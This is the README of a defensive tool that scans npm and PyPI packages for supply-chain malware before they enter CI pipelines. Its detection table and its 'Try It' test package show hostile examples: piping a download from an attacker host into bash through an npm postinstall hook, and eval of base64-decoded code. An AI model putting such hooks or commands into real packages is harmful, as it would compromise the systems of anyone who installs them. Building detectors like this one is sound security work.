# CI Supply Chain Guard

**Detect malicious packages before they compromise your CI/CD pipeline.**

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)

> **What it does:** Scans npm and Python packages for malicious code patterns (secret stealing, backdoors, shell injections) before you install them.

> **Author:** Otsmane Ahmed | **Status:** Research Prototype v1.0

---

## 🚀 Quick Start (30 seconds)

```bash
# 1. Clone and install
git clone https://github.com/Otsmane-Ahmed/ci-supplychain-guard.git
cd ci-supplychain-guard
python3 -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate
pip install -r requirements.txt

# 2. Scan a package directory
python3 main_guard.py /path/to/package
```

**That's it!** You'll get a verdict: `SAFE`, `SUSPICIOUS`, or `BLOCKED`

---

## 📖 What Can I Scan?

### ✅ Use Case 1: Before Installing a Package

**Scenario:** You found a package on npm/PyPI but want to check if it's safe.

```bash
# NPM package
npm pack suspicious-package
tar -xzf suspicious-package-*.tgz
python3 main_guard.py ./package

# Python package (download from PyPI, extract)
pip download untrusted-pkg --no-deps
tar -xzf untrusted-pkg-*.tar.gz
python3 main_guard.py ./untrusted-pkg-1.0.0
```

---

### ✅ Use Case 2: Scanning Your Project's Dependencies

**Scenario:** Check if dependencies in `node_modules` or `venv/lib` are malicious.

```bash
# Scan all installed npm packages
python3 main_guard.py ./node_modules

# Scan a specific Python package in venv
python3 main_guard.py ./venv/lib/python3.10/site-packages/requests
```

⚠️ **Note:** Scanning large directories (like all of `node_modules`) will take time. Scan individual packages for faster results.

---

### ✅ Use Case 3: CI/CD Pipeline Integration

**Scenario:** Block Pull Requests that add malicious dependencies.

**GitHub Actions Example:**
```yaml
name: Security Scan
on: [pull_request]
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Setup Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.10'
      - name: Install CI-Guard
        run: |
          git clone https://github.com/Otsmane-Ahmed/ci-supplychain-guard.git
          cd ci-supplychain-guard
          pip install -r requirements.txt
      - name: Scan Dependencies
        run: |
          cd ci-supplychain-guard
          python3 main_guard.py ../your-project-directory
```

If CI-Guard detects malicious code, the pipeline **fails** (exit code 1).

---

## 🎯 Understanding the Output

### Example 1: Safe Package ✅
```bash
$ python3 main_guard.py ./clean-package

Scanning target: ./clean-package
Running static analysis...
Static Risk Score: 0/100
Verdict: SAFE
```
✅ **What this means:** No malicious patterns detected. Safe to use.

---

### Example 2: Blocked Package 🚫
```bash
$ python3 main_guard.py ./evil-package

Scanning target: ./evil-package
Running static analysis...
Static Risk Score: 18/100
Verdict: BLOCKED (Critical Risk)
```
🚫 **What this means:** Found dangerous code (e.g., `curl | bash`, secret stealing). **Do NOT install.**

**Why it's blocked:**
- Score ≥10 = Auto-block (critical patterns like shell injection detected)

---

### Example 3: Suspicious Package ⚠️
```bash
$ python3 main_guard.py ./suspicious-package

Scanning target: ./suspicious-package
Running static analysis...
Static Risk Score: 6/100
Verdict: SUSPICIOUS (Score 6). Initiating sandbox...
```
⚠️ **What this means:** Some risky patterns found, but not conclusive. 
- If Docker is running: CI-Guard will test the package in a sandbox
- **Recommendation:** Review manually before using

---

## 🔍 What Does CI-Guard Detect?

| Attack Type | Example | Detected? |
|-------------|---------|-----------|
| **Shell Injection** | `curl evil.com \| bash` | ✅ |
| **Secret Stealing** | Reads `process.env` and sends to attacker | ✅ |
| **Obfuscated Code** | `eval(atob('base64...'))` | ✅ |
| **Malicious Install Hooks** | NPM `postinstall` scripts | ✅ |
| **Binary Smuggling** | `.exe`, `.dll` files in packages | ✅ |
| **Typosquatting** | Package name similar to popular ones | ⚠️ (manual check) |

---

## 🧪 Try It: Test with Sample Malicious Package

Want to see CI-Guard in action? Create a fake malicious package:

```bash
# Create test directory
mkdir ~/test-malicious
cd ~/test-malicious

# Create package.json with malicious postinstall hook
cat > package.json << 'EOF'
{
  "name": "evil-package",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "curl http://attacker.com/steal.sh | bash"
  }
}
EOF

# Scan it
cd ~/ci-supplychain-guard
python3 main_guard.py ~/test-malicious
```

**Expected output:**
```
Static Risk Score: 18/100
Verdict: BLOCKED (Critical Risk)
```

✅ **Success!** CI-Guard caught the malicious hook.

---

## 📊 Performance

| Ecosystem | Packages Tested | Detection Rate |
|-----------|----------------|----------------|
| **NPM** | 15,059 | **89.6%** |
| **PyPI** | 2,257 | **82.2%** |

**Scan Speed:** ~1-3 seconds per package (static analysis only)

---

## ❓ FAQ

### Q: Can I scan packages I've already installed?
**A:** Yes! Scan your `node_modules` or Python `site-packages`:
```bash
python3 main_guard.py ./node_modules/some-package
python3 main_guard.py ./venv/lib/python3.10/site-packages/requests
```

### Q: What if a safe package gets blocked (false positive)?
**A:** CI-Guard is conservative (better safe than sorry). If you trust a package:
1. Review the detection rules in `analyzer/static_scanner.py`
2. Check what pattern triggered (usually sensitive file access or network calls)
3. Manually verify the package source code

### Q: Does this work on Windows/Mac?
**A:** Yes! Python and Docker run on all platforms. Installation steps are the same.

### Q: Do I need Docker running?
**A:** Only if a package scores 4-9 (SUSPICIOUS). Most packages are either SAFE (0-3) or BLOCKED (≥10).

---

## 🛠️ Requirements

- **Python:** 3.10 or higher
- **Docker:** Optional (only for sandbox verification of suspicious packages)
- **OS:** Linux, macOS, Windows

---

## 📚 How It Works

CI-Guard uses a **"Traffic Light" protocol**:

1. **🟢 GREEN (Score 0-3):** SAFE - No malicious patterns
2. **🟡 YELLOW (Score 4-9):** SUSPICIOUS - Run in Docker sandbox for verification
3. **🔴 RED (Score ≥10):** BLOCKED - Critical malicious patterns detected

**Detection Methods:**
- **Static Analysis:** Regex + AST (Abstract Syntax Tree) to detect patterns
- **Reachability Analysis:** Filters out dead code to reduce false positives
- **Sandbox (optional):** Docker container with honeytokens to catch evasion techniques

---

## 🤝 Contributing

Found a bug or want to add detection rules? Pull requests welcome!

**Adding a new detection rule:**
Edit `analyzer/static_scanner.py` and add to the `RULES` list:
```python
{
    "id": "SA-XXX",
    "name": "Your Rule Name",
    "pattern": r"regex_pattern_here",
    "weight": 8  # Score contribution (1-10)
}
```

---

## 📄 License

MIT License - See [LICENSE](LICENSE) file

---

## 📧 Contact

**Otsmane Ahmed** - [GitHub](https://github.com/Otsmane-Ahmed)

**Research Paper:** [TechRxiv Preprint](https://doi.org/10.7910/DVN/...) *(Update with your DOI)*

---

## ⭐ Like this project?

Give it a star ⭐ on GitHub to help others discover it!

**Use CI-Guard in production?** Let me know - I'd love to hear your feedback!
